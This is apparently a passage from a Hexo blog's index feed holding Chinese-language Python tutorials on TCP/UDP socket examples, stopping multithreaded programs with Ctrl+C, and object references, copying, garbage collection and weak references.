class="hljs-keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">address = (<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">10140</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect(address)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    message = raw_input()</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> message:</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    s.send(message)</span><br><span class="line">    data = s.recv(<span class="hljs-number">512</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">'server:'</span>, data</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h1 id="2-UDP"><a href="#2-UDP" class="headerlink" title="2. UDP"></a>2. UDP</h1><h2 id="2-1-UDP-Server"><a href="#2-1-UDP-Server" class="headerlink" title="2.1 UDP-Server"></a>2.1 UDP-Server</h2><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># UDP-Server</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">address = (<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">10141</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.bind(address)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    data, addr = s.recvfrom(<span class="hljs-number">2048</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"received:"</span>, data, <span class="hljs-string">"from"</span>, addr</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h2 id="2-2-UDP-Client"><a href="#2-2-UDP-Client" class="headerlink" title="2.2 UDP-Client"></a>2.2 UDP-Client</h2><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># UDP-Client</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> socket  </span><br><span class="line">  </span><br><span class="line">address = (<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">10141</span>)  </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:  </span><br><span class="line">    message = raw_input()  </span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> message:  </span><br><span class="line">        <span class="hljs-keyword">break</span>  </span><br><span class="line">    s.sendto(message, address)  </span><br><span class="line">  </span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> Python </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 多线程响应 Ctrl + C，用 Event 实现</title>
      <link href="/hexo-blog/20130505/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%93%8D%E5%BA%94-Ctrl-C%EF%BC%8C%E7%94%A8-Event-%E5%AE%9E%E7%8E%B0/"/>
      <url>/hexo-blog/20130505/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%93%8D%E5%BA%94-Ctrl-C%EF%BC%8C%E7%94%A8-Event-%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>在用 python 编写多线程程序时，经常需要用 Ctrl + C 中止进程，可是大家都知道，在 python 中，除了主线程可以响应控制台的 Ctrl + C ，其他线程是无法捕获到的，也就是说，当主线程被中止后，其他线程也会被强制中止，这样线程们就没有机会处理自己还没有完成的工作。</p><p>而在实际应用中，我们可能会有这样的要求：</p><ol><li><p>当按下 Ctrl + C 时，我们希望所有线程先处理完自己的任务，再主动停止</p></li><li><p>当所有线程停止后，主线程才终止</p></li></ol><p>【<a href="http://my.oschina.net/apoptosis/blog/125099" target="_blank" rel="noopener">这篇文章</a>】提供了一种方法，我对其做了进一步改进，写了如下的代码，希望能起到抛砖引玉的作用：</p><a id="more"></a><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyThread</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, thread_num)</span>:</span></span><br><span class="line">        self.thread_num = thread_num        <span class="hljs-comment"># 线程个数</span></span><br><span class="line">        self.outLock = threading.Lock()     <span class="hljs-comment"># 控制台输出锁</span></span><br><span class="line">        self.threads = []                   <span class="hljs-comment"># 线程列表</span></span><br><span class="line">        self.interruptEvent = threading.Event() <span class="hljs-comment"># 键盘中断事件</span></span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">beginTask</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-comment"># 将线程加入线程列表</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(self.thread_num):</span><br><span class="line">            t_name = str(i + <span class="hljs-number">1</span>)</span><br><span class="line">            thread = threading.Thread(target=self.doSomething, kwargs=&#123;<span class="hljs-string">"t_name"</span>: t_name&#125;)</span><br><span class="line">            self.threads.append(thread)</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment"># 启动线程</span></span><br><span class="line">        <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> self.threads:</span><br><span class="line">            thread.start()</span><br><span class="line">        self.interruptEvent.clear()             <span class="hljs-comment"># clear</span></span><br><span class="line">        <span class="hljs-comment"># 用 isAlive 循环判断代替线程的 join 方法</span></span><br><span class="line">        </span><br><span class="line">        <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                alive = <span class="hljs-keyword">False</span></span><br><span class="line">                <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> self.threads:</span><br><span class="line">                    alive = alive <span class="hljs-keyword">or</span> thread.isAlive()</span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> alive:</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">            <span class="hljs-keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                self.interruptEvent.set()           <span class="hljs-comment"># set</span></span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doSomething</span><span class="hljs-params">(self, t_name)</span>:</span></span><br><span class="line">        self.outLock.acquire()</span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">u"线程 %s 已启动"</span> % t_name</span><br><span class="line">        self.outLock.release()</span><br><span class="line">        <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">if</span> self.interruptEvent.isSet():     <span class="hljs-comment"># isSet</span></span><br><span class="line">                    <span class="hljs-keyword">raise</span> KeyboardInterrupt</span><br><span class="line">                <span class="hljs-comment">########################</span></span><br><span class="line">                <span class="hljs-comment"># doSomething 函数代码 #</span></span><br><span class="line">                <span class="hljs-comment">########################</span></span><br><span class="line">            <span class="hljs-keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                <span class="hljs-comment">##################</span></span><br><span class="line">                <span class="hljs-comment"># 处理最后的工作 #</span></span><br><span class="line">                <span class="hljs-comment">##################</span></span><br><span class="line">                self.outLock.acquire()</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">u"用户强制中止主线程，线程 %s 已中止"</span> % t_name</span><br><span class="line">                self.outLock.release()                </span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">        self.outLock.acquire()</span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">u"线程 %s 已停止"</span> % t_name</span><br><span class="line">        self.outLock.release()</span><br><span class="line">        </span><br><span class="line">                        </span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    t = MyThread(<span class="hljs-number">5</span>)</span><br><span class="line">    t.beginTask()</span><br></pre></td></tr></table></figure><p>程序启动后，如图 1 所示：</p><img src="/hexo-blog/20130505/Python-多线程响应-Ctrl-C，用-Event-实现/184109_ddmL_730461.png"><p>按下 Ctrl + C 后，如图 2 所示：</p><img src="/hexo-blog/20130505/Python-多线程响应-Ctrl-C，用-Event-实现/184123_2RT2_730461.png"><p>这样各个线程都有机会处理自己的任务后主动停止，随后主线程再终止。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> Python </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 引用，拷贝，对象回收，弱引用</title>
      <link href="/hexo-blog/20130427/Python-%E5%BC%95%E7%94%A8%EF%BC%8C%E6%8B%B7%E8%B4%9D%EF%BC%8C%E5%AF%B9%E8%B1%A1%E5%9B%9E%E6%94%B6%EF%BC%8C%E5%BC%B1%E5%BC%95%E7%94%A8/"/>
      <url>/hexo-blog/20130427/Python-%E5%BC%95%E7%94%A8%EF%BC%8C%E6%8B%B7%E8%B4%9D%EF%BC%8C%E5%AF%B9%E8%B1%A1%E5%9B%9E%E6%94%B6%EF%BC%8C%E5%BC%B1%E5%BC%95%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>python中，在对对象赋值，参数传递，函数返回等等, 都是引用传递的. 直接copy个例子来【1】：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]</span><br><span class="line">b = a</span><br><span class="line">b.append(<span class="hljs-number">5</span>)</span><br><span class="line"><span class="hljs-keyword">print</span> a, b</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 5] [1, 2, 3, 5]</span><br></pre></td></tr></table></figure><p>面的结果有助于理解引用的实际情况。 具体查看一个对象的引用数，可以使用sys.getrefcount(ojb)获取，但这个函数有点邪恶，有时似乎并不给出正确的结果，正常来说获取的值都比你想要的大，一般是大1，因为给这个函数传参数也算一个引用。但有时会大得离谱，来例子：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> sys</span><br><span class="line">a = <span class="hljs-string">"a"</span></span><br><span class="line">sys.getrefcount(a)</span><br></pre></td></tr></table></figure><p>在我的机器上，输出结果尽然为14，网络遛了一圈，有人说是python内部对“a”这个对象进行了引用。好吧！就这样理解把，有高见的可以留言告我一下！</p><a id="more"></a><h2 id="拷贝【1】"><a href="#拷贝【1】" class="headerlink" title="拷贝【1】"></a>拷贝【1】</h2><p>拷贝主要有两种拷贝，分别以copy模块中的两个函数copy和deepcopy为代表。其中，前者复制对象本身，但对于对象中得元素，还是会使用的原本引用，copy个例子来：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list_of_lists = [ [<span class="hljs-string">'a'</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-string">'z'</span>, <span class="hljs-number">23</span>] ]</span><br><span class="line">copy_lol = copy.copy(lists_of_lists)</span><br><span class="line">copy_lol[<span class="hljs-number">1</span>].append(<span class="hljs-string">'boo'</span>)</span><br><span class="line"><span class="hljs-keyword">print</span> list_of_lists, copy_lol</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[&apos;a&apos;], [1, 2, &apos;boo&apos;], [&apos;z&apos;, 23]] [[&apos;a&apos;], [1, 2, &apos;boo&apos;], [&apos;z&apos;, 23]]</span><br></pre></td></tr></table></figure><p>考到第二个元素的情况了 把！用的还是引用。要想全部对对象本省进行拷贝，就得使用deepcopy了。</p><h2 id="对象回收"><a href="#对象回收" class="headerlink" title="对象回收"></a>对象回收</h2><p>Python使用了垃圾回收器来自动销毁那些不再使用的对象。当对某个对象的引用计数为0时， Python能够安全地销毁这个对象。表面上看来，在使用C或者C++时经常会碰到的内存泄露问题似乎也就解决了，但实际的情况是，请你小心！再copy个例子来【2】：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LeakTest</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">     <span class="hljs-keyword">print</span> <span class="hljs-string">'Object with id %d born here.'</span> % id(self)</span><br><span class="line">   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__del__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">     <span class="hljs-keyword">print</span> <span class="hljs-string">'Object with id %d dead here.'</span> % id(self)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span>:</span></span><br><span class="line">   A = LeakTest()</span><br><span class="line">   B = LeakTest()</span><br><span class="line">   A.b = B</span><br><span class="line">   B.a = A</span><br><span class="line"><span class="hljs-keyword">if</span> __name__ = =<span class="hljs-string">"__main__"</span>: </span><br><span class="line">  foo()</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object with id 10462448 born here.</span><br><span class="line">Object with id 10462832 born here.</span><br></pre></td></tr></table></figure><p>在构造一个类时，__init__会被自动调用；在进行对象回收时，__del__会被调用。很清楚的看到对象只是被创建了，而没有被回收，原因很简单，A和B的由于互相引用，他们的引用次数是不可能为0的，自然被回收也是不可能的了。这是，就应该考虑弱引用了。</p><h2 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h2><p>这是相对上面“引用”的一个概念，主要不同体现在对象回收时，上面我只提到当引用数为0，对象就会自动回收。其实还有另外一种情况，当自由只有对对象的弱引用时，对象也是会被回收。直接上代码，对上例做出一些修改：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> weakref</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LeakTest</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">     <span class="hljs-keyword">print</span> <span class="hljs-string">'Object with id %d born here.'</span> % id(self)</span><br><span class="line">   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__del__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">     <span class="hljs-keyword">print</span> <span class="hljs-string">'Object with id %d dead here.'</span> % id(self)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span>:</span></span><br><span class="line">   A = LeakTest()</span><br><span class="line">   B = LeakTest()</span><br><span class="line">   A.b = weakref.proxy(B)</span><br><span class="line">   B.a = weakref.proxy(A)</span><br><span class="line"><span class="hljs-keyword">if</span> __name__ = =<span class="hljs-string">"__main__"</span>: </span><br><span class="line">  foo()</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object with id 28637456 born here.</span><br><span class="line">Object with id 29402736 born here.</span><br><span class="line">Object with id 28637456 dead here.</span><br><span class="line">Object with id 29402736 dead here.</span><br></pre></td></tr></table></figure><p>OK了，对象被正常回收了！最后简单解说wekref中得几个函数【3】：</p><p>1. 创建弱引用：</p><p>你可以通过调用weakref模块的ref(obj[,callback])来创建一个弱引用，obj是你想弱引用的对象，callback是一个可选的函数，当因没有引用导致Python要销毁这个对象时调用。回调函数callback要求单个参数（弱引用的对象）。<br>一旦你有了一个对象的弱引用，你就能通过调用弱引用来获取被弱引用的对象。下面的例子创建了一个对socket对象的弱引用：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from socket import * </span><br><span class="line">&gt;&gt;&gt; import weakref </span><br><span class="line">&gt;&gt;&gt; s=socket(AF_INET,SOCK_STREAM) </span><br><span class="line">&gt;&gt;&gt; ref=weakref.ref(s) </span><br><span class="line">&gt;&gt;&gt; s </span><br><span class="line">&lt;socket._socketobject instance at 007B4A94&gt; </span><br><span class="line">&gt;&gt;&gt; ref </span><br><span class="line">&lt;weakref at 0x81195c; to &apos;instance&apos; at 0x7b4a94&gt; </span><br><span class="line">&gt;&gt;&gt; ref()    #调用它来访问被引用的对象 </span><br><span class="line">&lt;socket.socketobject instance at 007B4A94&gt;</span><br></pre></td></tr></table></figure><p>2. 创建代理对象<br>代理对象是弱引用对象，它们的行为就像它们所引用的对象，这就便于你不必首先调用弱引用来访问背后的对象。通过weakref模块的proxy(obj[,callback])函数来创建代理对象。使用代理对象就如同使用对象本身一样：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from socket import * </span><br><span class="line">&gt;&gt;&gt; import weakref </span><br><span class="line">&gt;&gt;&gt; s=socket(AF_INET,SOCK_STREAM) </span><br><span class="line">&gt;&gt;&gt; ref=weakref.proxy(s) </span><br><span class="line">&gt;&gt;&gt; s </span><br><span class="line">&lt;socket._socketobject instance at 007E4874&gt; </span><br><span class="line">&gt;&gt;&gt; ref </span><br><span class="line">&lt;socket._socketobject instance at 007E4874&gt; </span><br><span class="line">&gt;&gt;&gt; ref.close() #对象的方法同样工作</span><br></pre></td></tr></table></figure><p>callback参数的目的和ref函数相同。在Python删除了一个引用的对象之后，使用代理将会导致一个weakref.ReferenceError错误：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del s </span><br><span class="line">&gt;&gt;&gt; ref </span><br><span class="line">Traceback (most recent call last): </span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in ?</span><br></pre></td></tr></table></figure><p>3. getweakrefcount(obj)和getweakrefs(obj)分别返回弱引用数和关于所给对象的引用列表</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>【1】 <a href="http://blog.sina.com.cn/s/blog_5357c0af0100n2q5.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_5357c0af0100n2q5.html</a></p><p>【2】<a href="http://linhs.blog.51cto.com/370259/142846/" target="_blank" rel="noopener">http://linhs.blog.51cto.com/370259/142846/</a></p><p>【3】<a href="http://longmans1985.blog.163.com/blog/static/70605475200991613556128/" target="_blank" rel="noopener">http://longmans1985.blog.163.com/blog/static/70605475200991613556128/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 中用 Ctrl+C 终止多线程程序的问题解决</title>
      <link href="/hexo-blog/20130424/Python-%E4%B8%AD%E7%94%A8-Ctrl-C-%E7%BB%88%E6%AD%A2%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
      <url>/hexo-blog/20130424/Python-%E4%B8%AD%E7%94%A8-Ctrl-C-%E7%BB%88%E6%AD%A2%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>花了一天时间用python为服务写了个压力测试。很简单，多线程向服务器发请求。但写完之后发现如果中途想停下来，按Ctrl+C达不到效果，自然想到要用信号处理函数捕捉信号，使线程都停下来，问题解决的方法请往下看：</p><a id="more"></a><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment">#filename: peartest.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> threading, signal</span><br><span class="line"></span><br><span class="line">is_exit = <span class="hljs-keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doStress</span><span class="hljs-params">(i, cc)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> is_exit</span><br><span class="line">    idx = i</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> is_exit:</span><br><span class="line">    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">10000000</span>):</span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">"thread[%d]: idx=%d"</span>%(i, idx)</span><br><span class="line">        idx = idx + cc</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"thread[%d] complete."</span>%i</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handler</span><span class="hljs-params">(signum, frame)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> is_exit</span><br><span class="line">    is_exit = <span class="hljs-keyword">True</span></span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"receive a signal %d, is_exit = %d"</span>%(signum, is_exit)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    signal.signal(signal.SIGINT, handler)</span><br><span class="line">    signal.signal(signal.SIGTERM, handler)</span><br><span class="line">    cc = <span class="hljs-number">5</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(cc):</span><br><span class="line">        t = threading.Thread(target=doStress, args=(i,cc))</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure><p>上面是一个模拟程序，并不真正向服务发送请求，而代之以在一千万以内，每个线程每隔并发数个（cc个）打印一个整数。很明显，当所有线程都完成自己的任务后，进程会正常退出。但如果我们中途想退出（试想一个压力测试程序，在中途已经发现了问题，需要停止测试），该肿么办？你当然可以用ps查找到进程号，然后kill -9杀掉，但这样太繁琐了，捕捉Ctrl+C是最自然的想法。上面示例程序中已经捕捉了这个信号，并修改全局变量is_exit，线程中会检测这个变量，及时退出。</p><p>但事实上这个程序并不work，当你按下Ctrl+C时，程序照常运行，并无任何响应。网上搜了一些资料，明白是python的子线程如果不是daemon的话，主线程是不能响应任何中断的。但设为daemon后主线程会随之退出，接着整个进程很快就退出了，所以还需要在主线程中检测各个子线程的状态，直到所有子线程退出后自己才退出，因此上例29行之后的代码可以修改为：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">threads=[]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(cc):</span><br><span class="line">    t = threading.Thread(target=doStress, args=(i, cc))</span><br><span class="line">    t.setDaemon(<span class="hljs-keyword">True</span>)</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(cc):</span><br><span class="line">    threads[i].join()</span><br></pre></td></tr></table></figure><p>重新试一下，问题依然没有解决，进程还是没有响应Ctrl+C，这是因为join()函数同样会waiting在一个锁上，使主线程无法捕获信号。因此继续修改，调用线程的isAlive()函数判断线程是否完成：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><br><span class="line">    alive = <span class="hljs-keyword">False</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(cc):</span><br><span class="line">        alive = alive <span class="hljs-keyword">or</span> threads[i].isAlive()</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> alive:</span><br><span class="line">    <span 